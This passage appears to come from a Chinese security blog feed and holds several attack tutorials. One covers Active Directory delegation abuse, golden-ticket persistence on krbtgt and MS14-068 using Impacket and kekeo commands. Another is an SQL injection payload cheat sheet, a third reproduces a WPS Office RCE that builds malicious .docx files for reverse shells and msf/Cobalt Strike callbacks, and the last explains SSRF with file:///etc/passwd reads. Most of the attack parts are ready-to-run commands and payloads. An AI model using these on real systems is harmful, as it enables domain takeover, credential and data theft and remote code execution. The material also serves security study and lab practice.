<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache   </span><br><span class="line"></span><br><span class="line">python3 wmiexec.py WEB.hack-my.com -no-pass -k -dc-ip 10.150.127.186</span><br></pre></td></tr></table></figure></div>

<p>成功</p>
<p>ntlm-relay攻击的前提是，smb认证获取的机器没有开启smb签名</p>
<p>cve-2019-1040作用是绕过mic检验，因为打印机触发的是smb协议，域控是默认带有smb签名的，而这个漏洞在这里就刚好绕过了mic检验，就完成了 ntlm-relay攻击</p>
<h6 id="利用4-1"><a href="#利用4-1" class="headerlink" title="利用4"></a>利用4</h6><p>黄金票据变种</p>
<p>主要原理就是在获得域控权限后，对krbtgt用设置委派属性，来打造黄金票据，进行权限维持</p>
<p>步骤</p>
<p>创建一个机器账户 test4 123456</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230408161503905.png"
                      alt="image-20230408161503905"
                ></p>
<p>具体的不说了</p>
<p>然后来到域控上</p>
<p>powershell，去配置基于资源的约束委派</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount test4$</span><br><span class="line">Get-ADUser krbtgt -Properties PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230408161546381.png"
                      alt="image-20230408161546381"
                ></p>
<p>成功</p>
<p>现在来说krbtgt的密码hash怎么变都不会影响黄金票据的打造</p>
<p>申请票据（kali）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 getST.py haishi.com/test4\$:123456 -spn krbtgt -impersonate administrator -dc-ip 10.150.127.166</span><br></pre></td></tr></table></figure></div>

<p>导入票据</p>
<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br><span class="line"></span><br><span class="line">python3 smbexec.py -k administrator@DC.haishi.com -no-pass -dc-ip 10.150.127.166</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230408161735293.png"
                      alt="image-20230408161735293"
                ></p>
<p>完美</p>
<p>总结：委派可以比喻为你叫别人拿快递，你得把自己的取件码（票据）发给他才能找到你得快递</p>
<p>但是如果你买的东西涉及个人隐私，别人拿到你的取件码（票据）就会导致隐私泄露的问题，不过一般涉及隐私的也不会找别人拿，所以得使点手段了</p>
<p>这就像域控被委派导致其他主机账户具有域控的权限，就可以为所欲为</p>
<p>被委派的对象会将自己的票据发给委派主机，这是委派的机制，是不会变的</p>
<p>所以攻击思路就是想办法拿到域控的“取件码”，可以认为是强迫域控让你帮他拿快递，这样你就拿到域控的取件码（票据）就可以干域控可以干的事了</p>
<h3 id="PAC攻击"><a href="#PAC攻击" class="headerlink" title="PAC攻击"></a>PAC攻击</h3><h4 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h4><p>这个漏洞的原因是KDC无法正确检查PAC中的有效签名，因为实现签名的加密允许所有的签名算法，只要客户端指定任意签名算法，KDC服务器就会使用指定的算法进行签名验证，所以不需要相关的密钥算法，比如md5</p>
<p>这就导致了用户可以自己构造一张PAC，伪造用户的SID和所在的组</p>
<p>这个伪造的PAC，加入域管相关信息，访问域控服务，KDC就会认为该用户有权限，就把他当作域管理组的成员，这就为提升到域管理员提供了条件</p>
<h6 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h6><p>通过WIN2008上利用kekeo执行这个命令，就可以成功的访问域控的CIFS服务</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kekeo.exe &quot;exploit::ms14068 /domain:hack-my.com /user:username /password:password /ptt&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></div>

]]></content>
  </entry>
  <entry>
    <title>SQL注入</title>
    <url>/2023/05/15/SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="Sql注入一般步骤"><a href="#Sql注入一般步骤" class="headerlink" title="Sql注入一般步骤"></a>Sql注入一般步骤</h2><p>查看所有数据库</p>
<p>group_concat(schema_name)from information_schema.schemata</p>
<p>猜解表名</p>
<p>group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() </p>
<p>猜解列名</p>
<p>group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’ </p>
<p>数据爆破</p>
<p>group_concat(username,0x3a,password) from users</p>
<h2 id="SQL注入类型"><a href="#SQL注入类型" class="headerlink" title="SQL注入类型"></a>SQL注入类型</h2><h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><p>Union select 是联合查询的核心语句，类似U并运算</p>
<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>堆叠查询语句之间用；分开，在第二条构造要攻击的语句</p>
<p>Select verion；select database（）</p>
<p>可以任意使用增删改查，只返回第一条信息，第二条不返回</p>
<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>使用id&#x3D;1’and 1&#x3D;2–+  id&#x3D;1’and 1&#x3D;1–+ 判断是否有注入点，然后在使用堆叠语句	</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/wps1.jpg"
                      alt="img"
                > </p>
<p>获取到列，就可以执行增删改查</p>
<p>目前已经知道users：id username password</p>
<p>增：insert into users values(20,’123456’,’654321’)（添加账号）</p>
<p>查：insert into users values(20,（select authentication_string from mysql.user limit 1）,’654321’)为了解决第二条信息不返回的问题，只要利用子查询将查询到的值写入到新账号里，并用其id查询账号，就能显示了。</p>
<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>特点：不对查询到的数据进行回显</p>
<p>原理：对表名或列名进行拆解，逐一的获取表名的字母顺序，最终拼接成完整表名，获取到数据。</p>
<p>SQL语句实例：</p>
<p><a class="link"   href="http://127.0.0.1/sqli-labs-master/Less-5/?id=1" >http://127.0.0.1/sqli-labs-master/Less-5/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ and substring((select concat(table_name) from information_schema.tables where table_schema&#x3D;database() limit 1),1,1)&#x3D;’e’ – -</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/wps2.jpg"
                      alt="img"
                > </p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/wps3.jpg"
                      alt="img"
                > </p>
<p>不是该表&#x2F;列的字段，则不会回显You are in….</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/wps4.jpg"
                      alt="img"
                > </p>
<p>Substr（查询语句，1（2，3，4，5…），1）</p>
<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>与一次注入相比更难发现，且威胁相当</p>
<p>原理</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/wps5.jpg"
                      alt="img"
                > </p>
<p>简单来说就是两次输入数据的拼凑形成攻击语句</p>
<p>靶场第24关</p>
<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>%df’ - &gt; 经过gpc会转义成 - &gt; （%df&#x2F;’）%df%5c%27(%df%5c&#x3D;运 汉字) - &gt; 这样&#x2F;就被过滤掉了就可以利用 ‘ 进行注入</p>
<p>一般有gpc或者addslashes都存在宽字节注入</p>
<h3 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h3><p>与平时的注入差不多，以往是以get或者post的方式提交攻击语句，cookie注入则是以cookie进行提交数据。</p>
<p>一般用于get和post对数据进行过滤的情况下。</p>
<h3 id="Base64-编码注入"><a href="#Base64-编码注入" class="headerlink" title="Base64 编码注入"></a>Base64 编码注入</h3><p>靶场第21关</p>
<p>就是先转为base64编码致使‘ 保护被过滤掉，存进数据库的时候又解码为 ’ 使得攻击语句被注入</p>
<h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>一般用到函数 sleep（）、if（）、</p>
<p>substring（）截取字符串</p>
<p>Select if（2&gt;1，sleep（5），0） </p>
<p>意思是如果给2&gt;1就可以延迟5秒反之则不变，显然2是大于1的所以会延迟5秒</p>
<p>我们就可以利用这一特性，结合盲注的原理在2&gt;1位置上加上sql语句，如判断是否为这个‘e’时就可以反应出来，这样就可以逐个击破。</p>
<p><a class="link"   href="http://127.0.0.1/sqli-labs-master/Less-9/?id=1" >http://127.0.0.1/sqli-labs-master/Less-9/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ and if(((substr(concat(table_name) from information_schema.tables where table_schema&#x3D;database() limit 1),1,1)&#x3D;’e’),sleep(5),1)–+</p>
<p>通过if语句进行正确性判断，利用盲注思想，对其进行逐一判断</p>
<p>实例：sqli靶场 第九关<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/wps6.jpg"
                      alt="img"
                ></p>
<h2 id="SQL注入备忘录"><a href="#SQL注入备忘录" class="headerlink" title="SQL注入备忘录"></a>SQL注入备忘录</h2><p> 一 . 联合注入</p>
<p>列出所有数据库 : </p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">limit 一个一个打印出来库名</span><br><span class="line">		select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1</span><br><span class="line"></span><br><span class="line">group_concat 一次性全部显示</span><br><span class="line">		select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<p>列出(数据库：test)中所有的表</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">limit 一个一个打印出来字段名</span><br><span class="line">		select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&#x27;test&#x27; limit 0,1</span><br><span class="line"></span><br><span class="line">	group_concat 一次性全部显示</span><br><span class="line">		select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=0x674657374</span><br><span class="line">			注意：数据库名称可以用十六进制来代替字符串，这样可以绕过单引号的限制。</span><br></pre></td></tr></table></figure></div>



<p>列出（数据库：test 表：admin ）中所有的字段</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">imit 一个一个打印出来</span><br><span class="line">		select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA=&#x27;test&#x27; and TABLE_NAME=&#x27;t10&#x27; limit 0,1</span><br><span class="line">		</span><br><span class="line">	group_concat 一次性全部显示</span><br><span class="line">		select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA=0x74657374 and TABLE_NAME=0x61646d696e</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<p>列出（数据库：test 表：admin ）中所有的字段内容</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">limit 一个一个打印出来</span><br><span class="line">		select username,passwd from test.admin limit 0,1</span><br><span class="line"></span><br><span class="line">group_concat 把 一次性全部打印</span><br><span class="line">		select group_concat(concat(username,0x20,passwd)) from test.admin</span><br></pre></td></tr></table></figure></div>



<h3 id="二-报错注入"><a href="#二-报错注入" class="headerlink" title="二 . 报错注入"></a>二 . 报错注入</h3><p>请注意,如果需要全部显示数据库需要用到substr函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select substr(字符串,1,截取长度)</span><br><span class="line">select substr((select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA),1,7);</span><br></pre></td></tr></table></figure></div>



<h6 id="floor报错"><a href="#floor报错" class="headerlink" title="floor报错 :"></a>floor报错 :</h6><p>获取总共多少数据库</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (select 1 from(select count(*),concat((select (select (select concat(0x7e,count(schema_name),0x7e) from information_schema.schemata)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure></div>



<p>列出数据库</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">单个列出 :</span><br><span class="line">and(select 1 from (select count(*),concat(concat((select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1)),floor(rand(0)*2))x from information_schema.tables group by x)y)</span><br></pre></td></tr></table></figure></div>



<p>查询表和字段直接把联合注入的payload放进去就可以了</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">and(select 1 from (select count(*),concat(concat((payload),0x7e),floor(rand(0)*2))x from information_schema.tables group by x)y)</span><br></pre></td></tr></table></figure></div>



<h6 id="ExtractValue报错"><a href="#ExtractValue报错" class="headerlink" title="ExtractValue报错"></a>ExtractValue报错</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">and extractvalue(1, (concat(0x7e,(payload),0x7e))</span><br><span class="line"></span><br><span class="line">and extractvalue(1, concat(0x7e,(select @@version),0x7e))</span><br></pre></td></tr></table></figure></div>



<h6 id="UpdateXML报错"><a href="#UpdateXML报错" class="headerlink" title="UpdateXML报错"></a>UpdateXML报错</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">and updatexml(1,(payload),1)</span><br><span class="line"></span><br><span class="line">and updatexml(1, (concat(0x7e,(select user()),0x7e)),1)</span><br></pre></td></tr></table></figure></div>



<h3 id="三-布尔注入"><a href="#三-布尔注入" class="headerlink" title="三 .布尔注入 :"></a>三 .布尔注入 :</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (select ascii(substr((payload), 1, 1)))&gt;105 </span><br></pre></td></tr></table></figure></div>



<h3 id="四-时间注入"><a href="#四-时间注入" class="headerlink" title="四 . 时间注入 :"></a>四 . 时间注入 :</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(ascii(substr((payload), 1, 1))=114, sleep(5), 1)</span><br></pre></td></tr></table></figure></div>



<h3 id="五-宽字节注入"><a href="#五-宽字节注入" class="headerlink" title="五 .宽字节注入"></a>五 .宽字节注入</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GB2312,GBK,GB18030,BIG5等这些都是常见的宽字节,实际为2字节</span><br><span class="line"></span><br><span class="line">如果使用了类似于set names gbk这样得语句,此时mysql数据库就会将</span><br><span class="line"></span><br><span class="line">Ascii大于128(%df)得字符当作是汉字字符得一部分,从而能吃掉\,引入单引号或者双引号</span><br></pre></td></tr></table></figure></div>

]]></content>
  </entry>
  <entry>
    <title>WPS-RCE</title>
    <url>/2024/02/29/WPS-RCE/</url>
    <content><![CDATA[<h1 id="WPS-RCE"><a href="#WPS-RCE" class="headerlink" title="WPS-RCE"></a>WPS-RCE</h1><h3 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h3><p>WPS Office 2023个人版＜11.1.0.15120；WPS Office 2019企业版＜11.8.2.12085</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>本次的漏洞，就是WPS在处理WebExtension时，未能正确的处理javascript代码，造成了溢出RCE</p>
<p>Office 中的 WebExtension（通常称为 Office 插件或 Office 应用程序）是一种用于扩展 Microsoft Office 功能的技术。Office 插件使第三方开发者能够在 Office 应用程序中集成自己的服务和功能。这些插件采用跨平台的 Web 技术（如 HTML, CSS 和 JavaScript）开发，可以在不同的平台和设备上运行</p>
<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>下载poc进行利用，需要python3.8以上</p>
<p><a class="link"   href="https://github.com/ba0gu0/wps-rce" >https://github.com/ba0gu0/wps-rce <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>需要先下载依赖库</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">进入poc文件夹</span><br><span class="line">pip install -r requirement.txt -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824093207374.png"
                      alt="image-20230824093207374"
                ></p>
<p>然后进入server文件夹</p>
<p>运行main.py</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ./server/</span><br><span class="line">python3 main.py</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824093523106.png"
                      alt="image-20230824093523106"
                ></p>
<p>然后就在本地开启了一个web服务，里面有具体利用的信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824093609422.png"
                      alt="image-20230824093609422"
                ></p>
<p>在受害者主机上添加一个host以便域名访问</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">IP地址  clientweb.docer.wps.cn.hhhwps.cn</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824094053627.png"
                      alt="image-20230824094053627"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824094454425.png"
                      alt="image-20230824094454425"
                ></p>
<h3 id="弹出计算器"><a href="#弹出计算器" class="headerlink" title="弹出计算器"></a>弹出计算器</h3><p>也就是访问就会弹出计算器</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://clientweb.docer.wps.cn.hhhwps.cn/calc</span><br></pre></td></tr></table></figure></div>

<p>接下载需要我们整合到一个.docx中</p>
<p>运行client的main.py用来生成文档文件</p>
<p>进行client文件夹中，运行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 main.py nihao.docx http://clientweb.docer.wps.cn.hhhwps.cn/calc </span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824100020207.png"
                      alt="image-20230824100020207"
                ></p>
<p>实测新版的wps所生成的文档是不可注入的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824095231441.png"
                      alt="image-20230824095231441"
                ></p>
<p>就生成了一个nihao.docx文档，带有payload的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824100129471.png"
                      alt="image-20230824100129471"
                ></p>
<p>在目标主机上运行，即可弹出计算器</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824123824650.png"
                      alt="image-20230824123824650"
                ></p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>生成docx文档</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824124111773.png"
                      alt="image-20230824124111773"
                ></p>
<p>服务端设置监听</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824124002442.png"
                      alt="image-20230824124002442"
                ></p>
<p>上传文档并执行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824124542373.png"
                      alt="image-20230824124542373"
                ></p>
<p>服务端收到shell</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824124520108.png"
                      alt="image-20230824124520108"
                ></p>
<h3 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h3><p>同理也是先生成文档</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824124711308.png"
                      alt="image-20230824124711308"
                ></p>
<p>服务端设置监听</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824125017958.png"
                      alt="image-20230824125017958"
                ></p>
<p>上传主机进行执行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824125117510.png"
                      alt="image-20230824125117510"
                ></p>
<p>攻击机收到shell</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824125145833.png"
                      alt="image-20230824125145833"
                ></p>
<h3 id="上线cs"><a href="#上线cs" class="headerlink" title="上线cs"></a>上线cs</h3><p>先开启cs服务</p>
<p>由于cs服务和poc服务的端口冲突，需要将poc服务端口改掉再启动</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824130004962.png"
                      alt="image-20230824130004962"
                ></p>
<p>这边改成443端口</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824125833208.png"
                      alt="image-20230824125833208"
                ></p>
<p>然后再次开启cs服务</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824125916286.png"
                      alt="image-20230824125916286"
                ></p>
<p>cs启动！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824130108452.png"
                      alt="image-20230824130108452"
                ></p>
<p>照样生成文档</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824130241726.png"
                      alt="image-20230824130241726"
                ></p>
<p>然后上传运行</p>
<p>嗯嗯嫩~~</p>
<p>主机上线不了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824130942287.png"
                      alt="image-20230824130942287"
                ></p>
]]></content>
  </entry>
  <entry>
    <title>SSRF漏洞</title>
    <url>/2023/04/14/SSRF%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>ssrf是指攻击者向服务器发送包含恶意URL链接的请求，借这个服务器去访问URL。</p>
<p>通常是被用于探测攻击者无法访问到的网络区域，比如服务器所在的内网，或者是受防火墙访问限制的主机</p>
<p>ssrf漏洞的产生是由于服务端的web应用需要从其他的服务器上拉取数据，如图片、视频、文件的上传下载等，但是关键的就是，由于疏忽或者其他原因，这个请求地址可以被外部用户控制，这就导致了漏洞的产生。</p>
<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><p>内网探测：对内网服务器、办公机进行端口扫描、资产扫描、漏洞扫描</p>
<p>窃取本地或者内网敏感数据：访问或下载内网的敏感数据，利用file服务访问服务器本地的文件</p>
<p>攻击服务器本地或内网应用：利用发现的漏洞进一步发起攻击利用</p>
<p>跳板攻击：借助ssrf的漏洞利用这台服务器对内或者对外发起攻击，这样就可以隐藏自己的IP地址</p>
<p>绕过安全防御：可以绕过如防火墙或者waf等安全设备的防御，因为这些安全设备一般不对服务器进行流量监控</p>
<p>拒绝服务攻击：使服务器请求超大的文件，保持连接keep-alive always</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>PHP中的代码函数使用不当就会造成SSRF攻击</p>
<h6 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h6><p>这个协议作用是把整文件读入一个字符串中</p>
<p>语法：file_get_contents(path,include_path,context,start,mac_length)</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/cbfc0a66466b42279035c4f0973adb7f.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230413180255276.png"
                      alt="image-20230413180255276"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230413180327206.png"
                      alt="image-20230413180327206"
                ></p>
<p>访问这个文件即可</p>
<h6 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h6><p>开启这个函数需要php.ini中的allow_url_fopen&#x3D;On</p>
<p>用于打开网络的Socket连接</p>
<p>语法：fsockopen($host, $port, $errno, $errstr, $timeout)</p>
<p>在使用这个函数之后会放回文件指针，供文件函数使用，包括fgets()、fgetss()、fputs()、fclose()与feof()参数errno和errstr也是可以省略的，主要当做错误出处理使用</p>
<h6 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h6><p>它会执行一个cURL会话</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230413220824075.png"
                      alt="image-20230413220824075"
                ></p>
<h4 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h4><h6 id="http-x2F-s"><a href="#http-x2F-s" class="headerlink" title="http&#x2F;s"></a>http&#x2F;s</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230413221435446.png"
                      alt="image-20230413221435446"
                ></p>
<p>设置URL和相应的选项</p>
<p>curl_setopt($ch,CURLOPRT_URL,”Al.png”);&#x2F;&#x2F;抓取网页内容</p>
<p>curl_setopt($ch,CURLOPT_HEADER,0);&#x2F;&#x2F;不返回头部字段</p>
<h6 id="file-x2F-x2F-：从文件系统中获取文件内容，如，file-x2F-x2F-x2F-etc-x2F-passwd"><a href="#file-x2F-x2F-：从文件系统中获取文件内容，如，file-x2F-x2F-x2F-etc-x2F-passwd" class="headerlink" title="file:&#x2F;&#x2F;：从文件系统中获取文件内容，如，file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd"></a>file:&#x2F;&#x2F;：从文件系统中获取文件内容，如，file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</h6><p>用于访问虚拟机的本地文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230413222327093.png"
                      alt="image-20230413222327093"
                ></p>
<h6 id="dict-x2F-x2F-：字典服务器协议，访问字典资源，如，dict-x2F-x2F-ip-6739-x2F-info"><a href="#dict-x2F-x2F-：字典服务器协议，访问字典资源，如，dict-x2F-x2F-ip-6739-x2F-info" class="headerlink" title="dict:&#x2F;&#x2F;：字典服务器协议，访问字典资源，如，dict:&#x2F;&#x2F;ip:6739&#x2F;info"></a>dict:&#x2F;&#x2F;：字典服务器协议，访问字典资源，如，dict:&#x2F;&#x2F;ip:6739&#x2F;info</h6><p>用来探测内网主机的存活与端口开放情况</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230413222623061.png"
                      alt="image-20230413222623061"
                ></p>
<p>上图说明开放3306端口，说明具有mysql数据库</p>
<h6 id="ftp协议：文件传输"><a href="#ftp协议：文件传输" class="headerlink" title="ftp协议：文件传输"></a>ftp协议：文件传输</h6><p>这里没有输入用户和密码，所以他不现实ftp连接地址下的文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230413230316765.png"
                      alt="image-20230413230316765"
                ></p>
<p>要复现这个漏洞就需要搭建ftp服务器</p>
